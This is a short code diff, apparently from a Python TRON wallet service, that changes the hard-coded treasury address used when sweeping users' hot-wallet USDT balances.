@@ -274,7 +274,7 @@ def send_to_treasure() -> None:
             try:
                 priv_key = PrivateKey(bytes.fromhex(u.private_key))
                 txn = (
-                    contract.functions.transfer('TKURSXevVTf5h2AdrCkv8ecQCyQ3iCFXHj', int(u.hot_balance_usdt*1000000))
+                    contract.functions.transfer('TWKe8uGQpARMi3ejmdvd9UP9kh8sXT4C3x', int(u.hot_balance_usdt*1000000))
                     .with_owner(u.addr) # address of the private key
                     .fee_limit(20_000_000)
                     .build()
